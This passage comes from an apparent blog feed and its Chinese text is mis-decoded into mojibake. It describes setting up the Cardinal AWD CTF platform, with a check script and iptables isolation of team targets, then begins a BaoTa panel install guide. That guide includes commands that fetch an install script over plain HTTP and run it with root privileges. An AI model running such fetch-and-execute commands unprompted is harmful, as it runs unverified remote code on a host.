src="/../img/image-20240923164601525.png" alt="image-20240923164601525"></p><p>3ã€é˜Ÿä¼ç®¡ç†<br>æ·»åŠ é˜Ÿä¼ï¼Œå¹¶ä¸Šä¼ é˜Ÿä¼å›¾ç‰‡ logoï¼Œæ·»åŠ é˜Ÿä¼åï¼Œä¼šå¼¹å‡ºé˜Ÿä¼è´¦å·å’Œå¯†ç ï¼Œéœ€ä¿å­˜ã€‚è‹¥å¿˜è®°å¯é€šè¿‡ç®¡ç†ç«¯æ›´æ”¹è´¦å·å¯†ç ã€‚ </p><p><img src="/../img/image-20240923164616693.png" alt="image-20240923164616693"></p><p><img src="/../img/image-20240923164623791.png" alt="image-20240923164623791"></p><p>4ã€é¢˜ç›®ç®¡ç†<br>é¢˜ç›®å¯è‡ªå®šä¹‰åˆ†æ•°ï¼Œå¹¶å¯ä»¥è®¾ç½®ä¸ºè‡ªåŠ¨æ›´æ–° Flagï¼Œè‡ªåŠ¨æ›´æ–° flagé»˜è®¤æ–¹å¼æ˜¯å°† flag å†™å…¥æ ¹ç›®å½•ä¸‹çš„ flag æ–‡ä»¶ï¼Œå½“ç„¶ï¼Œflag å­˜åœ¨çš„ä½ç½®å¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›è¡Œè‡ªå®šä¹‰ã€‚ </p><p><img src="/../img/image-20240923164640310.png" alt="image-20240923164640310"></p><p>5ã€é¶æœºç®¡ç†<br>æ·»åŠ é¶æœºå‰ï¼Œéœ€è¦æ‰‹åŠ¨åˆ›å»ºå¯¹åº”é˜Ÿä¼æ•°é‡çš„ docker å®¹å™¨ï¼Œè¿™é‡Œä»¥ä¸‰ä¸ªé˜Ÿä¼ä¸ºä¾‹ã€‚ </p><p><img src="/../img/image-20240923164656007.png" alt="image-20240923164656007"></p><p>åˆ›å»ºé¶æœºè¿™é‡Œæœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„ä¸€ä¸ªç‚¹æ˜¯ï¼ŒFlag SSH çš„ç”¨æˆ·å¿…é¡»ä¸º rootï¼Œå¦åˆ™ï¼Œflag æ˜¯å†™å…¥ä¸åˆ°é¶æœºé‡Œçš„ã€‚ </p><p><img src="/../img/image-20240923164718071.png" alt="image-20240923164718071"></p><p>è®¾ç½®å®Œæˆ SSH è´¦å·å¯†ç åï¼Œå¯ä»¥æµ‹è¯•æ˜¯å¦å¯ä»¥æ­£å¸¸è¿æ¥ã€‚ </p><p><img src="/../img/image-20240923164729286.png" alt="image-20240923164729286"></p><p>6ã€Flag ç®¡ç†</p><p>å®Œæˆé¢˜ç›®å’Œé¶æœºåˆ›å»ºåï¼Œéœ€è¦ç”Ÿæˆ flagã€‚ ç›´æ¥ç‚¹å‡» Flag ç®¡ç†é¡µé¢çš„â€œç”Ÿæˆ Flagâ€å³å¯ã€‚</p><p><img src="/../img/image-20240923164744601.png" alt="image-20240923164744601"></p><p>7ã€é…ç½®ç®¡ç†<br>åœ¨ç®¡ç†ç«¯é…ç½®ç®¡ç†é¡µé¢å¯ä»¥è‡ªå®šä¹‰æ¯”èµ›åç§°ã€Flag å‰åç¼€ç­‰ï¼Œä¹Ÿå¯è®¾ç½®é˜Ÿä¼é¶æœºæ˜¯å¦ç›¸äº’å¯è§ã€‚<br>è‹¥è®¾ç½®é˜Ÿä¼é¶æœºç›¸äº’å¯è§ï¼Œåˆ™åœ¨é€‰æ‰‹ç«¯å¯ä»¥çœ‹åˆ°æ‰€æœ‰é¶æœºåˆ—è¡¨å†…çš„æ‰€æœ‰é¶æœºã€‚<br>8ã€é‡å»ºç«èµ›<br>å› ä¸ºè¯¥å¹³å°æ— æ³•é€šè¿‡ web é¡µé¢è¿›è¡Œåˆ›å»ºæ¯”èµ›ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡æ‰§è¡Œ Cardinal ä½¿ç”¨å‘½ä»¤è¡Œè¿›è¡Œåˆ›å»ºã€‚<br>éé¦–æ¬¡åˆ›å»ºæ¯”èµ›ï¼Œé»˜è®¤ä¸ä¼šé‡æ–°è¿›è¡Œå¼•å¯¼è®¾ç½®ï¼Œå› ä¸º Cardinal ä¼šå»åŠ è½½ conf æ–‡ä»¶å¤¹ä¸‹çš„ Cardinal.toml é…ç½®æ–‡ä»¶ã€‚<br>å†æ¬¡åˆ›å»ºç«èµ›æ—¶ï¼Œç›´æ¥ç¼–è¾‘ Cardinal.toml æ–‡ä»¶ï¼Œä¿å­˜å¹¶æ‰§è¡Œå³å¯ã€‚ </p><p><img src="/../img/image-20240923164758772.png" alt="image-20240923164758772"></p><p>å…³äº Cardinal.toml é…ç½®æ–‡ä»¶ï¼Œé‡å»ºç«èµ›æ—¶ï¼Œåªéœ€è¦å…³æ³¨æ¯”èµ›å¼€å§‹æ—¶é—´ã€ç»“æŸæ—¶é—´ã€è½®æ¬¡åˆ·æ–°æ—¶é—´ã€æ”»å‡»&#x2F;check åˆ†æ•°ç­‰é¡¹å³å¯ã€‚<br>9ã€æ³¨æ„äº‹é¡¹ </p><p>â€‹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä»¥ä¸Šé…ç½®å‡éœ€è¦åœ¨ç«èµ›å¼€å§‹å‰å®Œæˆã€‚</p><p>å››ã€é€‰æ‰‹ç«¯</p><p>â€‹æ ¹æ®åœ¨ç®¡ç†ç«¯åˆ›å»ºç”Ÿæˆçš„é˜Ÿä¼è´¦å·å¯†ç è¿›è¡Œç™»å½•ã€‚</p><p><img src="/../img/image-20240923164833089.png" alt="image-20240923164833089"></p><p>é€‰æ‰‹ç«¯ï¼Œå¯ä»¥çœ‹åˆ°ç«èµ›é¶æœºï¼Œæäº¤ Flagï¼ŒæŸ¥çœ‹æ’åå’Œå…¬å‘Šç­‰ã€‚ </p><p>äº”ã€Asteroid 3D å®æ—¶å¤§å±é…ç½®<br>Asteroid æ˜¯ä½¿ç”¨ Unity3D å¼€å‘çš„ä¸€æ¬¾ AWD 3D å®æ—¶å¤§å±ï¼Œåç«¯å·²ä¸ Cardinal å¹³å°æ·±åº¦æ•´åˆã€‚ </p><p>Asteroid ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/wuhan005/Asteroid/releases">https://github.com/wuhan005/Asteroid/releases</a></p><p><img src="/../img/image-20240923164903182.png" alt="image-20240923164903182"></p><p>1ã€ä¸‹è½½åè§£å‹å‹ç¼©åŒ… </p><p><img src="/../img/image-20240923164915894.png" alt="image-20240923164915894"></p><p>2ã€ç¼–è¾‘ .&#x2F;Asteroid_Data&#x2F; StreamingAssets&#x2F; ç›®å½•ä¸‹çš„ asteroid.ini æ–‡ä»¶ã€‚ </p><p>å°† localhost æ”¹ä¸ºå¹³å° ip åœ°å€å¹¶ä¿å­˜ï¼Œå¦‚ä¸‹ï¼š </p><p><img src="/../img/image-20240923164940685.png" alt="image-20240923164940685"></p><p>3ã€å›åˆ° Asteroid_Data æ–‡ä»¶å¤¹åŒçº§ç›®å½•ï¼Œæ‰“å¼€ Asteroid.exeã€‚ </p><p>4ã€å±•ç¤ºæ•ˆæœå¦‚ä¸‹ï¼š </p><p><img src="/../img/image-20240923164954387.png" alt="image-20240923164954387"></p><p>å…­ã€é¶æœº check<br>1ã€å…³äº Cardinal å¹³å°çš„ Check åŠŸèƒ½<br>å¹³å°é‡Œå¹¶æ²¡æœ‰é›†æˆ Check çš„åŠŸèƒ½ï¼ŒCheck å’Œå¹³å°æ˜¯åˆ†å¼€çš„ã€‚<br>å¹³å°ä¼šä¸º Check æä¾›ä¸€ä¸ª Check è´¦å·ï¼Œç”¨æ¥è¯·æ±‚é¢˜ç›®æ¥å£è¿›è¡Œæ‰£åˆ†ã€‚ </p><p>è´¦å·ç®¡ç† -&gt; æ·»åŠ ç®¡ç†å‘˜è´¦å· -&gt; å‹¾é€‰â€œCheck è´¦å·â€ã€‚ </p><p><img src="/../img/image-20240923165012778.png" alt="image-20240923165012778"></p><p>å½“ Check æ£€æµ‹åˆ°é¶æœºæœåŠ¡å™¨ä¸å¯ç”¨æ—¶ï¼ŒCheck ä¼šä½¿ç”¨ç®¡ç†å‘˜è´¦å·å‘å¹³å°æ¥å£å‘é€è¯·æ±‚ï¼Œå¹³å°æ”¶åˆ°åå°†å¯¹åº”é¶æœºçŠ¶æ€è®¾ä¸º Downï¼Œå¹¶åœ¨æœ¬è½®ç»“æŸåˆ†æ•°ç»“ç®—æ—¶æ‰£åˆ†ã€‚</p><p>2ã€Check ç¤ºä¾‹è„šæœ¬ </p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">import</span> requests <br><span class="hljs-comment"># Check åˆ¤æ–­é€»è¾‘ </span><br><span class="hljs-comment"># å‘é€ CheckDown ä¿¡æ¯åˆ°å¹³å° </span><br>TOKEN = <span class="hljs-string">&#x27;CHECK_MANAGER_TOKEN_HERE&#x27;</span>  <span class="hljs-comment"># Check Token </span><br>GameBoxID = <span class="hljs-number">1</span> <br>resp = requests.post(<span class="hljs-string">&#x27;http://localhost:19999/api/manager/checkDown&#x27;</span>, <br> json=&#123;<span class="hljs-string">&#x27;GameBoxID&#x27;</span>: GameBoxID&#125;, <br>  headers=&#123;<span class="hljs-string">&#x27;Authorization&#x27;</span>: TOKEN&#125;).json() <br>  <br><span class="hljs-keyword">if</span> resp[<span class="hljs-string">&#x27;error&#x27;</span>] != <span class="hljs-number">0</span>:  <br> <span class="hljs-built_in">print</span>(resp[<span class="hljs-string">&#x27;msg&#x27;</span>]) <br></code></pre></td></tr></table></figure><p>3ã€å¦‚ä½•å®ç°è‡ªåŠ¨ Check<br>ç”±äº Cardinal å¹³å°ä¸èƒ½å®ç°è‡ªåŠ¨ Check åŠŸèƒ½ï¼Œå› æ­¤è‹¥æƒ³å®ç°è‡ªåŠ¨ Checkï¼Œéœ€ä¾èµ–ç¬¬ä¸‰æ–¹å·¥å…·ã€‚è¿™é‡Œæ¨è Linux ä¸‹çš„ Crontab å®šæ—¶ä»»åŠ¡å·¥å…·æ¥å®ç° Check è„šæœ¬çš„å®šæ—¶è¿è¡Œã€‚ </p><p>Crontab å®šæ—¶ä»»åŠ¡å·¥å…·ä½¿ç”¨æ•™ç¨‹ï¼Œè¯·å‚è§</p><p>ä¸ƒã€é¶æœºçš„æ‰¹é‡åˆ›å»ºä¸é‡ç½®<br>1ã€é¶æœºçš„æ‰¹é‡åˆ›å»º<br>Cardinal AWD å¹³å°å¹¶æœªé›†æˆå…³äºé¶æœºçš„åˆ›å»ºå’Œé¶æœºçš„é‡ç½®åŠŸèƒ½ï¼Œå› æ­¤ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œéœ€è¦æˆ‘ä»¬é€šè¿‡æ‰‹åŠ¨æ–¹å¼å»åˆ›å»ºé¶æœºï¼ˆdocker å®¹å™¨ï¼‰ã€‚è¿™ç§æ–¹å¼å¯è¡Œï¼Œä½†æ˜¯å¦‚æœé˜Ÿä¼å¯¹è¾ƒå¤šæˆ–é¶æœºæ•°é‡å¤šçš„æ—¶å€™ï¼Œæ‰‹åŠ¨åˆ›å»ºé¶æœºæ˜¯ä¸€ä»¶éå¸¸éº»çƒ¦çš„äº‹æƒ…ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ shell è„šæœ¬å»å®ç°æ‰¹é‡åˆ›å»ºé¶æœºçš„åŠŸèƒ½ã€‚<br>2ã€æ‰¹é‡åˆ›å»ºé¶æœº shell è„šæœ¬<br>æ‰§è¡Œè„šæœ¬ï¼Œæ ¹æ®æç¤ºè¾“å…¥éœ€è¦åˆ›å»ºé¶æœºçš„ docker imagesã€æœåŠ¡ç«¯å£ä»¥åŠæ•°é‡å³å¯ã€‚ </p><p>è„šæœ¬æ¶‰åŠå‚æ•°å¯æ ¹æ®é¶æœºæƒ…å†µè‡ªè¡Œä¿®æ”¹ä½¿ç”¨ã€‚ </p><p><img src="/../img/image-20240923165240321.png" alt="image-20240923165240321"></p><p>3ã€é‡ç½®é¶æœº<br>ä¸é¶æœºçš„åˆ›å»ºä¸€æ ·ï¼ŒCardinal AWD å¹³å°ä¾ç„¶æ²¡æœ‰é›†æˆé‡ç½®é¶æœºçš„åŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨ shell è„šæœ¬æ¥å®ç°è¯¥åŠŸèƒ½ã€‚<br>é‡ç½®é¶æœºçš„åŠŸèƒ½æˆ‘ä»¬è™½ç„¶å¯ä»¥ä½¿ç”¨ shell è„šæœ¬çš„æ–¹å¼æ¥å®ç°ï¼Œä½†æ˜¯ï¼Œé‡ç½®æ‰£åˆ†çš„è¡Œä¸ºå¹¶æ— æ³•å®ç°ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥è¿›è¡Œç»Ÿè®¡ã€‚åç»­å†å¯¹å¹³å°çš„ç ”ç©¶è¿‡ç¨‹ä¸­ä¼šé€æ­¥è€ƒè™‘è¯¥åŠŸèƒ½çš„åŠ å…¥ã€‚</p><p>4ã€é‡ç½®é¶æœº shell è„šæœ¬<br>é‡ç½®é¶æœºçš„åŠŸèƒ½æ˜¯ä¾æ®é˜Ÿä¼é¶æœºçš„ç«¯å£æ¥è¿›è¡Œå¯»æ‰¾çš„ï¼Œå› ä¸ºé˜Ÿä¼å¯¹åº”é¶æœºçš„ç«¯å£æ˜¯å”¯ä¸€çš„ã€‚<br>æ ¹æ®æç¤ºï¼Œè¾“å…¥é˜Ÿä¼å¯¹åº”é¶æœºçš„ç«¯å£å·ï¼Œè¿™é‡Œé™åˆ¶äº†éœ€è¦åŒæ—¶è¾“å…¥ http æœåŠ¡å’Œ ssh æœåŠ¡çš„ç«¯å£æ¥åˆ¤æ–­é˜Ÿä¼çš„å”¯ä¸€æ€§ï¼Œå¦‚æœè¾“å…¥çš„ httpæœåŠ¡ç«¯å£å’Œ ssh æœåŠ¡ç«¯å£æ˜¯ä¸åŒé¶æœºçš„ï¼Œåˆ™ä¼šè¦æ±‚é‡æ–°è¾“å…¥ã€‚</p><p><img src="/../img/image-20240923165305211.png" alt="image-20240923165305211"></p><p>è„šæœ¬è¯¦è§é™„ä»¶ reset_target.sh </p><p>å…«ã€é¶æœºçš„éš”ç¦»ä¸å…¨é€š<br>åœ¨ AWD ç«èµ›ä¸­ï¼Œé€šå¸¸åœ¨æ¯”èµ›å¼€å§‹åçš„å‰åŠå°æ—¶è‡³ä¸€å°æ—¶çš„æ—¶é—´æ˜¯åŠ å›ºæ—¶é—´ã€‚åœ¨åŠ å›ºæ—¶é—´æ®µå†…ï¼Œæ¯æ”¯é˜Ÿä¼åªèƒ½è®¿é—®è‡ªå·±é˜Ÿä¼çš„é¶æœºï¼Œä¸èƒ½è®¿é—®å’Œæ”»å‡»å…¶ä»–é˜Ÿä¼çš„é¶æœºã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªåŠŸèƒ½è¯¥å¹³å°æ˜¯æ— æ³•å®ç°çš„ï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨ iptables æ¢ç´¢å‡ºäº†ä¸€ä¸ªæ–°çš„æ–¹æ¡ˆã€‚<br>1ã€iptables å®ç°ç«¯å£éš”ç¦»<br>å®éªŒåŸç†ï¼šé…ç½® iptables è§„åˆ™ï¼Œæ¥é™åˆ¶æŒ‡å®š ipï¼ˆæˆ– ip æ®µï¼‰è®¿é—®æŒ‡å®šç«¯å£ã€‚ç”±äºæˆ‘ä»¬ä½¿ç”¨å’Œè®¿é—®çš„ç«¯å£æ˜¯å®¹å™¨æ˜ å°„åˆ°è™šæ‹Ÿæœºä¸Šçš„ç«¯å£ï¼Œè¦å® ç°çœŸæ­£çš„ç«¯å£éš”ç¦»ï¼Œæˆ‘ä»¬å°±éœ€è¦å°† iptables è§„åˆ™é…ç½®åœ¨ DOCKER-USER é“¾ä¸Šï¼ŒåŒæ—¶æ·»åŠ é“¾æ¥è¿½è¸ªæ¨¡å—ï¼Œæ¥è´Ÿè´£è§£å†³ docker å®¹å™¨å†…éƒ¨ ipå’Œç«¯å£ä¸è™šæ‹Ÿæœº ip å’Œç«¯å£ä¸åŒ¹é…çš„é—®é¢˜ã€‚<br>Demoï¼š </p><p><img src="/../img/image-20240923165354383.png" alt="image-20240923165354383"></p><p>è§£é‡Šï¼š<br>é™åˆ¶ 192.168.63.180 åªèƒ½è®¿é—®è¯¥é¶æœºçš„ 8801 ç«¯å£ï¼Œå…¶ä»–åŒç†ã€‚æœ€åä¸€æ¡é™åˆ¶å…¶ä»– ip è®¿é—®ã€‚å…¶ä¸­ï¼Œens33 ä¸ºè™šæ‹Ÿæœºç½‘å¡ã€‚<br>å½“é˜Ÿä¼æ•°é‡ï¼ˆå« ip æ•°é‡ï¼‰äº¤å¤šçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¦‚æœæ‰‹åŠ¨æ¥å»åˆ›å»ºiptables è§„åˆ™ï¼Œä¼šç›¸å½“çš„éº»çƒ¦ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä½¿ç”¨æ‰¹é‡ shell è„šæœ¬æ¥å®ç°è¯¥åŠŸèƒ½ã€‚<br>æ‰¹é‡åˆ›å»º iptables è§„åˆ™å®ç°éš”ç¦»çš„æ‰¹é‡è„šæœ¬è¯¦è§é™„ä»¶ï¼šcreate_iptbs.sh<br>2ã€iptables å®ç°æ‰€æœ‰é˜Ÿä¼ï¼ˆé€‰æ‰‹ï¼‰ä¸æ‰€æœ‰é¶æœºå…¨é€š<br>å½“åŠ å›ºæ—¶é—´ç»“æŸåï¼Œéœ€è¦ä¿è¯ä»¥ä¸‹ä¸¤ç‚¹ï¼šç¬¬ä¸€ï¼Œæ‰€æœ‰é˜Ÿä¼çš„æ‰€æœ‰é€‰æ‰‹ä¸æ‰€æœ‰é¶æœºæ˜¯å¯ä»¥é€šä¿¡çš„ï¼›ç¬¬äºŒï¼Œé™¤äº†å‚èµ›é˜Ÿä¼ ip ä»¥å¤–çš„æ‰€æœ‰ip è¿›åˆ¶è®¿é—®ç«èµ›é¶æœºã€‚<br>å®ç°æ‰€æœ‰é€‰æ‰‹ä¸æ‰€æœ‰é¶æœºå…¨é€šçš„éš¾åº¦è¦æ¯”å®ç°éš”ç¦»çš„éš¾åº¦è¦ä½ä¸€äº›ï¼Œè§„åˆ™è·Ÿå®ç°éš”ç¦»çš„è§„åˆ™å·®ä¸å¤šï¼Œdemo å¦‚ä¸‹ï¼š </p><p><img src="/../img/image-20240923165409303.png" alt="image-20240923165409303"></p><p>è„šæœ¬çš„åŸç†ï¼šæ·»åŠ è§„åˆ™å…è®¸æ‰€æœ‰å‚èµ›é€‰æ‰‹è®¿é—®æ‰€æœ‰é¶æœºçš„æ‰€æœ‰ç«¯å£ã€‚ </p><p>è„šæœ¬è¯¦è§é™„ä»¶ï¼šdel_iptbs.sh </p><p>ä¹ã€å…¶ä»–<br>1ã€å…³äºæ¯”èµ›æ—¶é—´çš„è®¾ç½®<br>åˆ›å»ºç«èµ›å‰ï¼Œéœ€ç¡®è®¤å¹³å°å®¿ä¸»æœºæ—¶é—´æ˜¯å¦ä¸ºä¸œå…«åŒºæ—¶é—´ï¼Œä»¥å…ç«èµ›æ—¶é—´è®¾ç½®é”™è¯¯ã€‚ </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">date</span> -R    <span class="hljs-comment">#æŸ¥çœ‹å½“å‰æ—¶åŒº </span><br></code></pre></td></tr></table></figure><p>è‹¥æ—¶åŒºä¸ç¬¦åˆä¸œå…«åŒºæ—¶é—´ï¼Œè¯·å‚è§è§£å†³æ–¹æ¡ˆï¼šLinux ä¸‹ä¿®æ”¹æ—¶åŒºä¸ºä¸œå…«åŒº2ã€ä¸€å®šè¦ç•™å‡ºè¶³å¤Ÿçš„æ—¶é—´æ¥é…ç½®é¢˜ç›®ï¼Œå°½é‡æå‰åˆ›å»ºç«èµ›ï¼Œæˆ–å°½é‡å°†æ¯”èµ›è®¾ç½®åœ¨ 15-25 åˆ†é’Ÿåçš„æ—¶é—´ä½œä¸ºå¼€å§‹æ—¶é—´ï¼Œç•™å‡ºè¶³å¤Ÿçš„æ—¶é—´æ¥è¿›è¡Œé˜Ÿä¼ã€é¢˜ç›®ã€é¶æœºç­‰åŠŸèƒ½çš„é…ç½®ã€‚<br>3ã€å»ºè®® Cardinal ä½¿ç”¨ mysql çš„é root ç”¨æˆ·ï¼Œå¹¶è®¾ç½®å¥½å¤æ‚å¯†ç ã€‚ 4ã€å…³äº AWD é¶æœº Check é—®é¢˜ï¼Œé¶æœºçš„ Check è„šæœ¬éœ€è¦æ ¹æ®ä¸åŒçš„é¶æœºæ¥å®šåˆ¶ç¼–å†™ï¼Œç¼–å†™æ—¶æŒ‰ç…§ä¸Šè¿°å¹³å°å¯¹äº Check æ¥å£çš„å®šä¹‰æ¥ç¼–å†™ï¼Œå¯å°† Check ç»“æœä¸Šä¼ è‡³å¹³å°è¿›è¡Œæ•°æ®çš„å¤„ç†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF AWD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¯å¢ƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœåŠ¡å™¨éƒ¨ç½²</title>
    <link href="/2024/09/12/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/"/>
    <url>/2024/09/12/%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<p>ä½ æä¾›çš„æ­¥éª¤æè¿°äº†å¦‚ä½•åœ¨ Linux ç³»ç»Ÿä¸Šå®‰è£… <strong>å®å¡”é¢æ¿ 7.3</strong> ç‰ˆæœ¬å¹¶è¿›è¡Œåˆæ­¥é…ç½®ã€‚è¿™æ˜¯ä¸€ä¸ªè¯¦ç»†çš„æŒ‡å—ï¼Œé€‚ç”¨äº CentOSã€Ubuntuã€Debianã€Fedora ç­‰ Linux å‘è¡Œç‰ˆï¼Œå®‰è£…æ­¥éª¤å¦‚ä¸‹ï¼š</p><h3 id="å®‰è£…å®å¡”é¢æ¿æ­¥éª¤ï¼š"><a href="#å®‰è£…å®å¡”é¢æ¿æ­¥éª¤ï¼š" class="headerlink" title="å®‰è£…å®å¡”é¢æ¿æ­¥éª¤ï¼š"></a><strong>å®‰è£…å®å¡”é¢æ¿æ­¥éª¤ï¼š</strong></h3><h4 id="1-ç™»å½•æœåŠ¡å™¨"><a href="#1-ç™»å½•æœåŠ¡å™¨" class="headerlink" title="1. ç™»å½•æœåŠ¡å™¨"></a>1. <strong>ç™»å½•æœåŠ¡å™¨</strong></h4><p>ä½¿ç”¨ SSH è¿æ¥åˆ°ä½ çš„é˜¿é‡Œäº‘æœåŠ¡å™¨ï¼ˆæˆ–è€…å…¶ä»–äº‘æœåŠ¡å™¨ï¼‰ï¼Œç¡®ä¿ä½ ä½¿ç”¨çš„æ˜¯å…·æœ‰ <strong>sudo æƒé™</strong> çš„ç”¨æˆ·è´¦å·ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh root@ä½ çš„æœåŠ¡å™¨IPåœ°å€<br></code></pre></td></tr></table></figure><h4 id="2-å®‰è£…å®å¡”é¢æ¿"><a href="#2-å®‰è£…å®å¡”é¢æ¿" class="headerlink" title="2. å®‰è£…å®å¡”é¢æ¿"></a>2. <strong>å®‰è£…å®å¡”é¢æ¿</strong></h4><p>æ ¹æ®ä½ ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œæ‰§è¡Œç›¸åº”çš„å®‰è£…å‘½ä»¤ï¼š</p><ul><li><p><strong>CentOS&#x2F;Alibaba Cloud Linux</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh<br></code></pre></td></tr></table></figure></li><li><p><strong>Ubuntu&#x2F;Deepin</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; <span class="hljs-built_in">sudo</span> bash install.sh<br></code></pre></td></tr></table></figure></li><li><p><strong>Debian</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh<br></code></pre></td></tr></table></figure></li><li><p><strong>Fedora</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh<br></code></pre></td></tr></table></figure></li></ul><h4 id="3-ç¡®è®¤å®‰è£…"><a href="#3-ç¡®è®¤å®‰è£…" class="headerlink" title="3. ç¡®è®¤å®‰è£…"></a>3. <strong>ç¡®è®¤å®‰è£…</strong></h4><p>å®‰è£…è¿‡ç¨‹ä¼šæç¤ºä½ è¾“å…¥ <code>y</code> ç¡®è®¤å®‰è£…ï¼ŒæŒ‰ç…§æç¤ºæ“ä½œå³å¯ã€‚</p><h4 id="4-è·å–ç™»å½•ä¿¡æ¯"><a href="#4-è·å–ç™»å½•ä¿¡æ¯" class="headerlink" title="4. è·å–ç™»å½•ä¿¡æ¯"></a>4. <strong>è·å–ç™»å½•ä¿¡æ¯</strong></h4><p>å®‰è£…å®Œæˆåï¼Œç³»ç»Ÿä¼šç”Ÿæˆå¹¶æ˜¾ç¤ºé¢æ¿ç™»å½•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li><strong>å¤–ç½‘é¢æ¿åœ°å€</strong>ï¼šç”¨äºå¤–ç½‘è®¿é—®å®å¡”é¢æ¿çš„ URLã€‚</li><li><strong>å†…ç½‘é¢æ¿åœ°å€</strong>ï¼šç”¨äºå†…ç½‘è®¿é—®å®å¡”é¢æ¿çš„ URLã€‚</li><li><strong>é»˜è®¤è´¦å·ï¼ˆusernameï¼‰</strong>ï¼šéšæœºç”Ÿæˆçš„ 8 ä½å­—æ¯å’Œæ•°å­—ç»„åˆã€‚</li><li><strong>é»˜è®¤å¯†ç ï¼ˆpasswordï¼‰</strong>ï¼šéšæœºç”Ÿæˆçš„ 8 ä½å­—æ¯å’Œæ•°å­—ç»„åˆã€‚</li></ul><p><strong>é‡è¦æç¤º</strong>ï¼šä¸€å®šè¦ä¿å­˜å¥½è¿™äº›ä¿¡æ¯ï¼Œå› ä¸ºä½ éœ€è¦å®ƒä»¬æ¥ç™»å½•å®å¡”é¢æ¿ã€‚</p><h4 id="5-å¼€æ”¾8888ç«¯å£"><a href="#5-å¼€æ”¾8888ç«¯å£" class="headerlink" title="5. å¼€æ”¾8888ç«¯å£"></a>5. <strong>å¼€æ”¾8888ç«¯å£</strong></h4><p>å®å¡”é¢æ¿é»˜è®¤ä½¿ç”¨ <code>8888</code> ç«¯å£ï¼ˆå¦‚æœå®‰è£…è¿‡ç¨‹ä¸­ç«¯å£æœ‰å˜åŠ¨ï¼Œè¯·æ ¹æ®æç¤ºä½¿ç”¨æ–°çš„ç«¯å£ï¼‰ã€‚ä½ éœ€è¦åœ¨é˜¿é‡Œäº‘æ§åˆ¶å°çš„ <strong>å®‰å…¨ç»„è§„åˆ™</strong> ä¸­å¼€æ”¾è¯¥ç«¯å£ï¼š</p><ul><li>ç™»å½•é˜¿é‡Œäº‘æ§åˆ¶å°ï¼Œè¿›å…¥ <strong>ECS å®ä¾‹</strong>ã€‚</li><li>ç‚¹å‡»å·¦ä¾§çš„ <strong>ç½‘ç»œå’Œå®‰å…¨ &gt; å®‰å…¨ç»„</strong>ï¼Œé€‰æ‹©ä½ æœåŠ¡å™¨æ‰€å±çš„å®‰å…¨ç»„ã€‚</li><li>åœ¨å…¥æ–¹å‘è§„åˆ™ä¸­ï¼Œæ·»åŠ å…è®¸ <code>8888</code> ç«¯å£çš„è§„åˆ™ã€‚</li></ul><h4 id="6-ä½¿ç”¨æµè§ˆå™¨ç™»å½•å®å¡”é¢æ¿"><a href="#6-ä½¿ç”¨æµè§ˆå™¨ç™»å½•å®å¡”é¢æ¿" class="headerlink" title="6. ä½¿ç”¨æµè§ˆå™¨ç™»å½•å®å¡”é¢æ¿"></a>6. <strong>ä½¿ç”¨æµè§ˆå™¨ç™»å½•å®å¡”é¢æ¿</strong></h4><ul><li>æ‰“å¼€æµè§ˆå™¨ï¼ˆæ¨èä½¿ç”¨ Chromeï¼‰ï¼Œåœ¨åœ°å€æ ä¸­è¾“å…¥æ­¥éª¤ 4 ä¸­è·å–çš„ <strong>å¤–ç½‘é¢æ¿åœ°å€</strong>ï¼Œå›è½¦ã€‚</li><li>è¾“å…¥ç³»ç»Ÿç”Ÿæˆçš„ <strong>username</strong> å’Œ <strong>password</strong>ï¼Œç„¶åç‚¹å‡» <strong>ç™»å½•</strong>ã€‚</li></ul><h4 id="7-ç»‘å®šå®å¡”è´¦å·"><a href="#7-ç»‘å®šå®å¡”è´¦å·" class="headerlink" title="7. 